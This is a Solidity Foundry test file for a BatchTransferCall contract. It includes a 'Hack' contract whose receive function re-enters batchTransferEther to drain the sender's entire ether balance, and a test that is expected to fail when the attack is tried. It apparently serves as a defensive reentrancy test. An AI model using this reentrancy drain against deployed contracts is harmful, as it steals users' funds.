pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {BatchTransferCall} from "../src/BatchTransferCall.sol";

contract Hack {
    receive() external payable {
        if (msg.sender.balance == 0) {
            return;
        }
        address payable[] memory recipients = new address payable[](1);
        recipients[0] = payable(address(this));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = msg.sender.balance;

        console.log("balance before hack", address(this).balance);
        BatchTransferCall(msg.sender).batchTransferEther(recipients, amounts);
        console.log("balance after hack", address(this).balance);
    }
}

contract BatchTransferTest is Test {
    BatchTransferCall public batchTransferCall;
    address hacker;

    function setUp() public {
        batchTransferCall = new BatchTransferCall();
        hacker = address(new Hack());
    }

    function testFail_Hack() public {
        address payable[] memory recipients = new address payable[](3);
        recipients[0] = payable(address(1));
        recipients[1] = payable(address(2));
        recipients[2] = payable(hacker);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        amounts[2] = 1 ether;

        batchTransferCall.batchTransferEther{value: 4 ether}(recipients, amounts);
    }
}
